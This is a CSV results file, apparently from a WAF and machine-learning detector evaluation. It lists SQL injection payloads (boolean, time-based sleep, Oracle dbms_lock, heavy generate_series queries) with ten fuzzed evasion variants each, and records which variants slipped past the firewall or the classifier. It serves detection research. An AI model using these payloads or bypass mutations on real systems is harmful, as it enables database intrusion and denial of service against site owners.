Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
7,2024-09-04T08:59:44.119108,"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",403,403,403,both_correct,"-'L'='L'')) as rupb wheRE  and 1=8218/**/OR
make_set(4954=(SELECT 1836),1836)--",2024-09-04T08:59:47.928252,200,403,waf_incorrect_ml_correct,"-'L' like 'L'')) As rupb WhERE  AnD 1=8218 oR make_set(0x135a=(seLECT  OR 0),'d'<>'d^')--",2024-09-04T08:59:53.917956,200,200,both_incorrect,"-'L' lIke 'L'')) As rupb WhERE  AnD (SELECT 1)=8218 oR make_set(0x135a=(seLECT/**/	OR (SELECT 4122) IN (4121,4122,4123)),'d'<>'d^')--",2024-09-04T09:00:00.120235,200,403,waf_incorrect_ml_correct,"-'L' lIKe/**/'L'')) As rupb WhERE  AnD (SELECT 5219 LIKE 5219)=8218 oR make_set(0x135a=(seLECT/*#b*/ OR (SELECT 0x101a) IN (4121,4122, OR 0)),'d'<>'d^')--",2024-09-04T09:00:08.565556,200,403,waf_incorrect_ml_correct,"-'L' like/*C*/'L'')) As rupb WhERE  AnD (SELECT (SELECT 1) LIKE 5219)='w'!='w.'
oR make_set(0x135a=(seLECT  OR (SELECT 0x101a) IN (4121,4122, OR 0x0)),'d'<>'d^')--",2024-09-04T09:00:17.147535,200,403,waf_incorrect_ml_correct,"-'L' liKE/**/'L'')) As/**/rupb WhERE  AnD (SELECT (SELECT 0x1) LIKE 5219)='w'!='w.'	oR make_set(0x135a=(seLECT  OR (SELECT 0x101a) IN ('y'!='yI', AND 1, OR 0x0)),'d'<>'d^')--",2024-09-04T09:00:25.601094,200,403,waf_incorrect_ml_correct,"-'L' lIKe/**/'L'')) As rupb WhERE  AnD (SELECT (SELECT 0x1) LIKE ',K.
2' LIKE ',K.
0x2')='w'!='w.' oR make_set(0x135a=(seLECT  OR (SELECT 0x101a) IN ('y'!='yI', AND (SELECT 1), OR 0x0)),'d'<>'d^')--",2024-09-04T09:00:34.009142,403,403,both_correct,"-'L' LIKE/**/'L'')) As
rupb WhERE  AnD (SELECT (SELECT/**/0x1) LIKE ',K.
 and (seleCt 1)' LIKE ',K.
0x2')='w'!='w.' oR make_set(0x135a=(seLECT  OR (SELECT 0x101a) IN ('y'!='yI', AND (SELECT 'H'<>'HV'), OR 0x0)),'d'<>'d^')--",2024-09-04T09:00:43.921056,403,403,both_correct,"-'L' liKe/**/'L'')) As
rupb WhERE  AnD (SELECT (SELECT 0x1) LIKE ',K.  and (seLECt (SElecT 0x1))' LIKE ',K.
0x2')='w'!='w.' oR make_set(0x135a=(seLECT  OR (SELECT 0x101a) IN ('y'!='yI', AND (SELECT 'H'<>'HV'), OR 0x0)),'d'<>'d^')--",2024-09-04T09:00:54.207363,403,403,both_correct,"-'L' LIKE/*O0}+F*/'L'')) As
rupb WhERE  AnD (SELECT (SELECT 0x1) LIKE ',K.  And (sELECt (SElecT 0x1))'/**/LIKE ',K.
0x2')='w'!='w.'
oR make_set(0x135a=(seLECT  OR (SELECT 0x101a) IN ('y'!='yI', AND (SELECT 'H'<>'HV'), OR 0x0)),'d'<>'d^')--",2024-09-04T09:01:05.283019,403,403,both_correct
8,2024-09-04T09:01:16.157677,-3520%' or 8571=8571--,403,403,403,both_correct,"-3520%'
OR 975 likE/**/0x3cf like (SELECT 1)--",2024-09-04T09:01:17.145535,403,403,both_correct,-(SELECT 3520)%' Or 975 like 0x3cf LIKE (SELect 1797 LIKE (SELECT 1))--,2024-09-04T09:01:20.153621,403,403,both_correct,"-(seLECt 'R'!='Rk')%' oR 0x3cf LiKE/**/0x3cf likE (SeleCT  OR 0 like	(SELeCT 1))--",2024-09-04T09:01:24.516947,403,403,both_correct,"-(seleCt 'R' not like 'Rk')%' oR 0x3cf liKe 0x3cf LIKe (selECt	 oR 0x0 Like	(seLEct  anD 2704 liKe 2704))--",2024-09-04T09:01:29.329650,403,403,both_correct,"-(sElEcT 'R' not like 'Rk')%' or 0x3cf liKe 0x3cf lIke (sELect  or 0x0 LIkE	(sELecT  And 'cNYz'<>'cNYz!' lIkE/**/ AND (SELECT 1)))--",2024-09-04T09:01:34.977141,403,403,both_correct,"-(SelEct 'R' not like 'Rk')%' or 0x3cf liKe 0x3cf lIke (sELect  or 0x0 LIkE
(sELecT  And 'cNYz'<>'cNYz!' liKe  && (sElECt (sElecT 0x1)!=4219)))--",2024-09-04T09:01:41.435010,403,200,waf_correct_ml_incorrect,-(SeLECT 'R'/**/not like 'Rk')%' or 0x3cf liKe 0x3cf lIke (sELect  or 0x0 LIkE (sELecT  And 'cNYz'<>'cNYz!' like  && (SeleCT (SELECt 0x1)!=0x107b)))--,2024-09-04T09:01:48.853095,403,403,both_correct,"-(SeLEct 'R' not like 'Rk')%' or 0x3cf liKe
0x3cf lIke (sELect  or 0x0 LIkE (sELecT  And 'cNYz'<>'cNYz!' liKE  && (SelECt (sELeCt 0x1)<>0x107b)))--",2024-09-04T09:01:56.430379,403,200,waf_correct_ml_incorrect,"-(SeLEcT 'R' not like 'Rk')%' or 0x3cf/**/liKe
0x3cf lIke
(sELect  or 0x0 LIkE (sELecT  And 'cNYz'<>'cNYz!' Like   and  (sElECt (seLEcT 0x1)<>0x107b)))--",2024-09-04T09:02:03.641440,403,200,waf_correct_ml_incorrect,"-(SeleCT 'R' not like 'Rk')%' or 0x3cf/**/liKe 0x3cf lIke
(sELect  or 0x0 LIkE (sELecT /**/And 'cNYz'<>'cNYz!' likE   aNd  (sElEcT (sElect 0x1)!=0x107b)))--",2024-09-04T09:02:11.554546,403,200,waf_correct_ml_incorrect
9,2024-09-04T09:02:19.212889,"c/ la hoz, 17",200,200,200,both_correct,"c//**/la hoz, 
anD (SELECT 7728 IN (7727,7728,7729))",2024-09-04T09:02:19.864465,200,403,waf_correct_ml_incorrect,"c/ la hoz, 	aNd (SElecT  or 0 IN ((SELECT 371) LIKE 371,7728,7729))",2024-09-04T09:02:23.349632,200,403,waf_correct_ml_incorrect,"c/ la hoz, 	aNd (SEleCT  oR
(SELECT 0) in/**/((seleCt 371) liKE (SELECT 1),7728,6974!=6975))",2024-09-04T09:02:27.501056,403,403,both_incorrect,"c/ la hoz,  aNd (seLEct  or
(sELeCT 0) iN/**/((select/**/371) LiKE (sELect 1),(sELEct ';rT' NOT LIKE ';rTp'),0x1b3e NOT LIKE 6975))",2024-09-04T09:02:32.802795,403,403,both_incorrect,"c/ la hoz,  aNd (Select  OR	(seLECt 'Q'<>'Qn') in ((seLEct/*9G\n^*/ OR 0) LiKe (SelecT (SELECT 1)),(sElECT ';rT' not like ';rTp'),0x1b3e NOT LIKE 6975))",2024-09-04T09:02:41.054631,403,403,both_incorrect,"c/ la hoz,  And (SELEcT  Or (selEct 'Q' NOT LIKE 'Qn') IN ((SEleCt  OR  AND 1) liKe (seLecT (SELeCT (sELEcT 'LZv' NOT LIKE 'LZv\'))),(sELect ';rT' not like ';rTp'),0x1b3e NOT LIKE 6975))",2024-09-04T09:02:49.962383,403,403,both_incorrect,"c/ la hoz,  aNd (SelecT  or (select 'Q' NOT LIKE 'Qn') In ((SelecT  or  anD/*?**/
And (SELECT 1)) liKe (seLECt (SELEct (sELecT 'LZv' not like 'LZv\'))),(sELect ';rT' not like ';rTp'),0x1b3e NOT LIKE 4682<>4683))",2024-09-04T09:03:00.552509,403,403,both_incorrect,"c/ la hoz,  AnD (sELECT  Or (SeLect 'Q' NOT LIKE 'Qn') In ((SELEcT  or 
and/*?**/
AND (seLECT 1)) likE (SElEct (seleCt (selecT/**/'LZv' not like 'LZv\'))),(sELect ';rT' not like ';rTp'),0x1b3e not like 0x178 lIkE 376<> and 1))",2024-09-04T09:03:10.896950,403,403,both_incorrect,"c/ la hoz, /**/anD (SELECT  or (seLEct 'Q' NOT LIKE 'Qn') in ((SELECt  Or 
anD/*?**/	aND (sElEct (SELECT 5338)!=5339)) like (seLECT (SElEct (selECT/**/'LZv' not like 'LZv\'))),(sELect ';rT' not like ';rTp'),0x1b3e not like 0x178 Like 376<> And  AND 1))",2024-09-04T09:03:21.288506,403,403,both_incorrect,"c/ la hoz, /**/AnD (SELeCT  oR (SElECT 'Q' not like 'Qn') iN ((SelecT  Or 
AnD/*?**/
AnD (selEcT (seLeCt  AND 1)!=(SELECT 5339))) likE (seleCt (SeLEcT (seleCT/**/'LZv' not like 'LZv\'))),(sELect ';rT' not like/**/';rTp'),0x1b3e not like 0x178 like 3482=3482<> aND  aND 1))",2024-09-04T09:03:33.825356,403,403,both_incorrect
10,2024-09-04T09:03:46.384167,[email],200,200,200,both_correct,[email],2024-09-04T09:03:47.702258,200,200,both_correct,[email],2024-09-04T09:03:50.102449,200,200,both_correct,[email],2024-09-04T09:03:52.613996,200,200,both_correct,[email],2024-09-04T09:03:55.227756,200,200,both_correct,[email],2024-09-04T09:03:57.626343,200,200,both_correct,[email],2024-09-04T09:04:00.059711,200,200,both_correct,[email],2024-09-04T09:04:02.553342,200,200,both_correct,[email],2024-09-04T09:04:04.882458,200,200,both_correct,[email],2024-09-04T09:04:07.265098,200,200,both_correct,[email],2024-09-04T09:04:09.722407,200,200,both_correct
11,2024-09-04T09:04:12.109129,"1' in boolean mode);select count(*) from generate_series(1,5000000)#",403,403,403,both_correct,"1' in boolean mode);SElEcT/**/count(*) fROM generate_series(6653 not like 6654,(sElEct
0x1))#b}",2024-09-04T09:04:15.484356,403,403,both_correct," OR 0' IN boolean mode);SElecT/**/count(*)
fRom/**/generate_series(5359 IN (5358,5359,5360) not like (SELECT 6654),(sELECT
0x1))#b}Y",2024-09-04T09:04:21.153848,403,403,both_correct," || 'k^d' LIkE 'k^d'' in boolean mode);seLECT/*1NI*/count(*)
FroM generate_series(5359 In (5358,5359,5360) not like (SeleCt  And (seLecT 1)),(Select 0x1))#b}Y",2024-09-04T09:04:28.166242,403,403,both_correct,"  OR  'k^d' liKE 'k^d'' iN boolean mode);seLect count(*)	FroM generate_series(5359 IN ( AND 1,5359,7473!=(SelecT 7474)) not like (SeleCT  and (sEleCT 1)),(SELECt 0x1))#b}Y3.",2024-09-04T09:04:35.638862,403,403,both_correct,"  ||  'k^d' liKE 'k^d'' iN boolean mode);seLect/**/count(*) FroM generate_series(5359 IN ( AND  AND 1,5359,7473!=(SelecT 0x1d32)) not like (SeleCT  and (sEleCT '^'!='^?')),(SeLeCt 0x1))#b}Y3.",2024-09-04T09:04:44.309204,403,403,both_correct,"   OR   'k^d' lIke 'k^d'' iN boolean mode);seLect/*QY*/count(*) FroM generate_series(5359 IN ( AND/**/ AND (SELECT 1),5359,(SELECT 7697
LIKE 7697)!=(SelecT 0x1d32)) not like (SeleCT  and (sEleCT '^'!='^?')),(seleCT 0x1))#b}Y3.",2024-09-04T09:04:53.623945,403,403,both_correct,"   or   'k^d' LiKe 'k^d'' iN boolean mode);seLect/**/count(*) FroM generate_series(0x14ef IN ( AND 
AND (SELECT 1),5359,(SELECT 2367 LIKE 2367
LIKE  OR 0)!=(SelecT 0x1d32)) not like (SeleCT  and (sEleCT '^'!='^?')),(SeLECT 0x1))#b}Y3.i",2024-09-04T09:05:03.859350,403,403,both_correct,"   ||   'k^d' liKe 'k^d'' iN boolean mode);seLect count(*) FroM generate_series(0x14ef IN ( AND 
AND (SELECT 1),0x14ef,(SELECT 
OR 0 LIKE 2367
LIKE  OR '[b' NOT LIKE '[By')!=(SelecT 0x1d32)) not like (SeleCT  and (sEleCT '^'!='^?')),(seLEct 0x1))#b}Y3.i,",2024-09-04T09:05:15.023200,403,403,both_correct," 	  or    'k^d' likE 'k^d'' iN boolean mode);seLect count(*) FroM generate_series(0x14ef IN ( AND 
AND (SELECT (SELECT 1)),0x14ef,(SELECT 
OR 0x0 LIKE 'T' NOT LIKE 'T@'
LIKE  OR '[b' NOT LIKE '[by')!=(SelecT 0x1d32)) not like (SeleCT  and (sEleCT '^'!='^?')),(seLEct/**/0x1))#b}Y3.i,Uk",2024-09-04T09:05:26.886995,403,403,both_correct," 	  oR    'k^d' lIke 'k^d'' iN boolean mode);seLect count(*) FroM generate_series(0x14ef IN ( AND 
AND (SELECT (SELECT 0x1)),0x14ef,(SELECT 
OR	0x0 LIKE 'T' NOT LIKE 'T@'
LIKE  OR '[b' NOT LIKE '[bY')!=(SelecT 0x1d32))/*QM}*/not like (SeleCT  and (sEleCT '^'!='^?')),(sEleCT/**/0x1))#b}Y3.i,Uk",2024-09-04T09:05:40.306043,403,403,both_correct
12,2024-09-04T09:05:53.439155,1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,403,403,403,both_correct,"9056/*b*/IN ((SELECT 1),9056,(SELECT 9057))');begin
dbms_lock.sleep(5); end and ('jzlr'='jzlr",2024-09-04T09:05:55.895304,403,403,both_correct,"9056/**/iN ((SELEct
1),9056,(SeLeCt 4440 LIKE  AND 1))');begin
dbms_lock.sleep((SELECT/*2rXe1*/5)); end and ('jzlr'='jzlr",2024-09-04T09:06:01.202529,403,403,both_correct,"9056 in ((seLEct
 AND 1),9056,(SeleCT (SELECT 4440)	liKE  && 'i'<>'iu'))');begin
dbms_lock.sleep((SELECT/*2rXe1*/5)); end and ('jzlr'='jzlr",2024-09-04T09:06:07.433451,200,403,waf_incorrect_ml_correct,"8058 NOT LIKE 8059 iN ((seLECt
 aNd 1),9056,(SeleCt (sELeCT 0x1158)
lIKe   AND  'i'<>'iu'))');begin
dbms_lock.sleep((SELECT  OR 0)); end and ('jzlr'='jzlr",2024-09-04T09:06:14.177415,200,200,both_incorrect," And 1 NOT
LIKE '`' LIKE '`' iN ((sElEcT
 AnD 1),9056,(sEleCT (SelecT 0x1158)
likE   and/**/ 'i' not like 'iu'))');begin
dbms_lock.sleep((SELECT  OR (SELECT 0))); end and ('jzlr'='jzlr",2024-09-04T09:06:21.781348,200,403,waf_incorrect_ml_correct," aNd 1 NOT
LIKE '`' LIKE '`' in ((Select
 aND (SELECT 1)),5951 like 5951,(seLECT (SElECt 0x1158)
liKe/**/  anD/**/ 'i' not like 'iu'))');begin dbms_lock.sleep((SELECT  OR (SELECT (SELECT 0)))); end and ('jzlr'='jzlr",2024-09-04T09:06:30.112246,200,403,waf_incorrect_ml_correct," && 1 NOT
LIKE '`' LiKE '`' In ((SelEcT
 aNd (select 1)),5951 lIke (seLEcT 5951),(selEct (SElECt 0x1158)
liKe   aNd/**/ 'i' not like 'iu'))');begin dbms_lock.sleep((SELECT  OR (SELECT (SELECT  AND 1<>7364)))); end	and ('jzlr'='jzlr",2024-09-04T09:06:40.065639,200,403,waf_incorrect_ml_correct,"  anD  (SelecT 1) NOT
LIKE '`' lIkE '`' IN ((SelEct
 and (SEleCT (sElEcT 1))),'bJP' LiKE 'bJP' liKe (SElECT 5951),(sElECt (sElEct 0x1158)
liKe   aNd  'i' not like 'iu'))');begin dbms_lock.sleep((SELECT  OR (SELECT (SELECT  AND 1<>7364)))); end
and ('jzlr'='jzlr",2024-09-04T09:06:51.511916,200,403,waf_incorrect_ml_correct,"  aNd  (select 6889 lIkE 6889) NOT
LIKE '`'/*({Y*/like '`' iN ((sElEct
 aNd (SeLecT (sEleCT 1))),'bJP' liKE 'bJP' LIKE (sELEcT  OR 0),(sEleCT (sElECt 0x1158)
LikE   AND  'i' not like 'iu'))');begin dbms_lock.sleep((SELECT  OR (SELECT (SELECT  AND 0x1<>7364)))); end and ('jzlr'='jzlr",2024-09-04T09:07:03.693282,200,403,waf_incorrect_ml_correct,"  and  (seLEct 6889 lIke 6889) NOT
LIKE '`'/*({Y*/lIKE '`' IN ((seleCt
 and/**/(sElECT (sEleCt (SELECT 1)))),'bJP' LIkE 'bJP' LiKE (SElect  Or 0),(SelECT (SELeCt 0x1158)	liKE   aND  'i' not like 'iu'))');begin dbms_lock.sleep((SELECT  OR (SELECT (SELECT  AND 0x1<>(SELECT '*'!='**'))))); end and ('jzlr'='jzlr",2024-09-04T09:07:16.209485,403,403,both_correct
13,2024-09-04T09:07:30.714307,1' where 7191=7191 rlike sleep(5)--,403,403,403,both_correct,"'8j>' NOT LIKE '8j>v'' Where/**/(sELEct 7191) like 7191
rlike sleep( oR 0)--",2024-09-04T09:07:32.312729,200,200,both_incorrect,"'8j>' not like
'8j>v'' wHErE (SEleCT  Or 0) lIKE 8512!=(selECT 8513)
rlike sleep( Or 0)--",2024-09-04T09:07:36.802885,200,200,both_incorrect,"'8j>'/**/not like
'8j>v'' wheRe (SELEct  or 2725 not like 2726) lIKe 8512!=(SELeCT (sELeCT 8513))
rlike sleep( OR 	anD 1)--",2024-09-04T09:07:42.269439,200,403,waf_incorrect_ml_correct,"'8j>'/**/not like
'8j>v'' whERe (seleCT  || 8081=8081 not like	0xaa6) liKE  OR 0!=(select/**/(SeLecT 8513))
rlike sleep( oR 	and 1)--",2024-09-04T09:07:49.567869,200,200,both_incorrect,"'8j>'/**/not like
'8j>v'' wheRE (SElEcT   or   AND 1=8081 not like	0xaa6) LIKe  OR 0x0!=(SeLeCT/**/(seleCt 8513))
rlike/**/sleep( oR 
aNd 5568 LIKE 5568)--",2024-09-04T09:07:57.930692,403,200,waf_correct_ml_incorrect,"'8j>'/**/not like
'8j>v'' wheRE (SElEcT   or   AND 1=(SELECT 1) not like	0xaa6) LIKe  OR 0x0!=(SeLeCT/**/(seleCt '{' NOT LIKE '{;'))
rlike sleep( oR 	And 0x15c0 LiKE 5568)--",2024-09-04T09:08:05.551279,200,403,waf_incorrect_ml_correct,"'8j>'/**/not like
'8j>v'' wheRE (SElEcT   or 
 AND 0x1=(SELECT '^' NOT LIKE '^$') not like	0xaa6) LIKe  OR 0x0!=(SeLeCT/**/(seleCt '{' NOT LIKE '{;'))
rlike sleep(/**/or 	and 0x15c0 LIKe  And 1)--",2024-09-04T09:08:14.569259,200,403,waf_incorrect_ml_correct,"'8j>' not like '8j>v'' wheRE (SElEcT   or 
 AND 0x1=(SELECT '^' NOT LIKE '^$') not like	0xaa6) LIKe  OR 0x0!=(SeLeCT/**/(seleCt '{' NOT LIKE '{;'))
rlike sleep(/**/OR 	anD 0x15c0 lIKe  AnD (SELECT  AND '`tl'!='`tl3'))--",2024-09-04T09:08:25.081369,200,403,waf_incorrect_ml_correct,"'8j>' not like '8j>v'' wheRE/*.P*/(SElEcT   or 
 AND 0x1=(SELECT '^' NOT LIKE '^$') not like
0xaa6) LIKe  OR 0x0!=(SeLeCT/**/(seleCt '{' NOT LIKE '{;'))
rlike sleep(/**/OR 	anD 0x15c0 lIKe  AnD (SELECT  AND '`tl'!='`tl3'))--",2024-09-04T09:08:36.337948,200,403,waf_incorrect_ml_correct,"'8j>' not like '8j>v'' wheRE/*.P*/(SElEcT   or 
 AND 0x1=(SELECT '^' NOT LIKE '^$') not like
0xaa6) LIKe  OR 0x0!=(SeLeCT/*^,>*/(seleCt '{' NOT LIKE '{;'))
rlike sleep( OR  anD 0x15c0 lIKe  AnD (SELECT  AND '`tl'!='`tl3'))--",2024-09-04T09:08:48.508517,200,403,waf_incorrect_ml_correct
